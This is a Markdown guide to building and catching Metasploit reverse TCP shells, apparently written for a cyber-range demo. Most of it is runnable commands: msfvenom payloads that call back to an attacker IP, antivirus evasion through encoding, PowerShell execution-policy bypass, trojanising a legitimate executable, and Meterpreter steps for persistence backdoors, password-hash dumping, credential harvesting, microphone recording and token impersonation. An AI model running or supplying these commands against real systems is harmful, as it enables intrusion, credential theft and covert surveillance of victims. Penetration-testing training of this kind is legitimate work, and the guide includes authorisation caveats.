# Metasploit TCP Reverse Shell - Demo Guide

## Overview

This guide walks through creating and exploiting a TCP reverse shell connection using Metasploit Framework. A reverse shell is a shell connection initiated by the target system back to the attacker's machine, giving the attacker command execution on the remote system.

**⚠️ Educational Use Only:** This guide is intended for authorized security testing and training in controlled environments (cyber ranges, labs, authorized penetration tests). Unauthorized access to computer systems is illegal.

## Prerequisites

- Metasploit Framework installed
- Attacker machine (Kali Linux recommended)
- Target machine(s) in cyber range
- Network connectivity between attacker and target
- Administrative/root access to execute payloads on target

## Part 1: Setting Up the Metasploit Listener

The listener waits for incoming reverse shell connections from the payload.

### Step 1: Launch Metasploit Console

```bash
msfconsole
```

You should see the Metasploit banner and prompt (`msf>`).

### Step 2: Set Up the Reverse TCP Handler

Use the `exploit/multi/handler` module to catch incoming connections:

```
msf> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```

**Note:** Replace `windows/meterpreter/reverse_tcp` with the appropriate payload:
- `windows/meterpreter/reverse_tcp` - Windows targets
- `linux/x86/meterpreter/reverse_tcp` - Linux targets (32-bit)
- `linux/x64/meterpreter/reverse_tcp` - Linux targets (64-bit)

### Step 3: Configure the Handler

Set your attacker machine's IP address and listening port:

```
msf exploit(multi/handler) > set LHOST 192.168.1.100
LHOST => 192.168.1.100

msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
```

**LHOST:** Your attacker machine's IP (where the payload connects back)  
**LPORT:** The listening port (use high-numbered ports like 4444, 8888, etc.)

### Step 4: Start the Listener

```
msf exploit(multi/handler) > exploit
[*] Starting persistent handler(s)...
[*] Meterpreter handler binding to 192.168.1.100:4444
[*] HTTP(s) Listener started on http://0.0.0.0:4000/
[*] https://0.0.0.0:8443/ handling (UUID: xxxx)
[*] To verify connectivity you can run these Metasploit commands ...
[*] Handler bound to port 4444
[*] Starting the payload handler...
```

The listener is now running and waiting for connections. Leave this terminal running.

---

## Part 2: Generating the Payload with msfvenom

In a new terminal, use `msfvenom` to generate the reverse shell payload.

### Step 1: Basic Payload Generation

#### For Windows Targets:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

#### For Linux Targets (64-bit):

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell
```

#### For Linux Targets (32-bit):

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell
```

### Step 2: Understanding msfvenom Options

- **`-p`** - Payload to use
- **`LHOST`** - Attacker's IP address (must match listener)
- **`LPORT`** - Attacker's listening port (must match listener)
- **`-f`** - Output format (exe, elf, dll, bin, etc.)
- **`-o`** - Output file path and name

### Step 3: Encoding to Bypass Antivirus (Optional)

Add encoding to bypass simple antivirus signatures:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o shell.exe
```

- **`-e`** - Encoder to use
- **`-i`** - Number of iterations (higher = better obfuscation but slower generation)

**Common Encoders:**
- `x86/shikata_ga_nai` - Polymorphic XOR encoder
- `x86/jmp_call_additive` - Jump/call XOR encoder
- `x86/fnstenv_mov` - FPU instruction encoder

---

## Part 3: Executing the Payload

### Method 1: Direct Execution (Linux Target)

```bash
./shell
```

### Method 2: Social Engineering (Windows Target)

Place the `.exe` on a web server or USB and have the user execute it.

### Method 3: PowerShell Delivery (Windows)

Generate a PowerShell-compatible payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f psh -o shell.ps1
```

Execute on target:

```powershell
powershell -ExecutionPolicy Bypass -File shell.ps1
```

### Method 4: Staged Payload (Smaller Initial Payload)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

---

## Part 4: Meterpreter Session Commands

Once the target executes the payload and connects, you'll see a meterpreter prompt in your Metasploit console.

### Basic System Commands

```
meterpreter > help                    # Display all available commands
meterpreter > sysinfo                 # Get system information
meterpreter > getuid                  # Get current user
meterpreter > whoami                  # Current user name
```

### File System Commands

```
meterpreter > pwd                     # Print working directory
meterpreter > ls                      # List files
meterpreter > cd C:\\Users            # Change directory
meterpreter > cat filename.txt        # Display file contents
meterpreter > upload localfile.txt    # Upload file to target
meterpreter > download remotefile.txt # Download file from target
```

### Process Management

```
meterpreter > ps                      # List running processes
meterpreter > migrate <PID>           # Migrate to another process
meterpreter > kill <PID>              # Terminate a process
```

### Shell Access

```
meterpreter > shell                   # Drop to system shell
C:\> whoami                           # Run Windows commands
C:\> exit                             # Return to meterpreter
```

### Network Commands

```
meterpreter > ipconfig                # Network configuration (Windows)
meterpreter > ifconfig                # Network configuration (Linux)
meterpreter > route                   # Display routing table
meterpreter > arp                     # Display ARP table
```

### Privilege Escalation

```
meterpreter > getsystem               # Attempt to escalate to SYSTEM/root
meterpreter > run post/windows/escalate/getsystem
```

### Persistence (Creating Backdoors)

```
meterpreter > run persistence -X -i 60 -p 4444 -r 192.168.1.100
```

Options:
- **`-X`** - Start at boot
- **`-i`** - Check-in interval (seconds)
- **`-p`** - Port
- **`-r`** - LHOST (attacker IP)

### Credential Harvesting

```
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > hashdump                # Dump password hashes (Windows)
```

### Screenshotting/Recording

```
meterpreter > screenshot              # Take a screenshot
meterpreter > record_mic -d 10        # Record audio for 10 seconds
```

### Advanced Capabilities

```
meterpreter > load incognito          # Load incognito module for token theft
meterpreter > list_tokens -u          # List available tokens
meterpreter > impersonate_token DOMAIN\\USER
```

---

## Part 5: Advanced Techniques

### Multiple Payload Handlers

Start multiple listeners on different ports:

**Terminal 1:**
```
msf> set LPORT 4444
msf> exploit
```

**Terminal 2:**
```
msf> set LPORT 4445
msf> exploit
```

### Staged vs. Stageless Payloads

- **Staged:** Initial small payload downloads full meterpreter (smaller file size, faster delivery)
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp ...  # Staged
  ```

- **Stageless:** Complete payload in one file (reliable but larger)
  ```bash
  msfvenom -p windows/meterpreter_reverse_tcp ...  # Stageless
  ```

### Database Logging

Store results in a database:

```
msf> db_connect postgresql://user:pass@localhost/msf
msf> db_status
msf> hosts                            # View discovered hosts
msf> services                         # View discovered services
```

### Creating a Custom Payload

Combine a legitimate executable with the payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o original.exe -x legitimate_program.exe
```

---

## Troubleshooting

### Payload Won't Connect

- **Check firewall:** Ensure LPORT is open on attacker machine
- **Verify IPs:** Confirm LHOST in payload matches listener
- **Test connectivity:** `ping` target from attacker machine
- **Check ports:** `netstat -an | grep 4444` to verify listener is active

### Session Drops

- **Network instability:** Cyber range network issues
- **Antivirus:** May be blocking meterpreter activity
- **Process termination:** Target process was killed
- **Migrate process:** Use `migrate` command to move to stable process

### Antivirus Detection

- Use encoding: `msfvenom ... -e x86/shikata_ga_nai -i 10`
- Obfuscate with tools like Veil-Evasion
- Split payload across multiple files
- Use fileless attacks (PowerShell, registry)

---

## Demo Script Example

```bash
#!/bin/bash
# Metasploit Demo Setup Script

# Colors for output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Starting Metasploit Listener...${NC}"
echo "msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit'"

echo -e "${GREEN}[+] In another terminal, generate payload:${NC}"
echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe"

echo -e "${YELLOW}[*] Then execute payload on target...${NC}"
```

---

## Safety and Legal Considerations

✅ **DO:**
- Only test in authorized cyber ranges
- Notify network administrators
- Document all activities
- Use isolated lab networks
- Obtain written permission

❌ **DON'T:**
- Attack production systems
- Target systems you don't own or have permission to test
- Install persistent backdoors without authorization
- Share credentials or sensitive data
- Leave backdoors installed after testing

---

## References

- [Metasploit Framework Official Documentation](https://docs.metasploit.com/)
- [msfvenom Documentation](https://docs.metasploit.com/docs/using-metasploit/basics/using-msfvenom.html)
- [Meterpreter Commands](https://docs.metasploit.com/docs/using-metasploit/basics/using-meterpreter.html)
- [OWASP Penetration Testing](https://owasp.org/www-community/attacks/Penetration_testing)

---

**Last Updated:** 2026-09-20  
**Intended For:** Educational and authorized security testing only  
**Environment:** Controlled cyber range/lab network
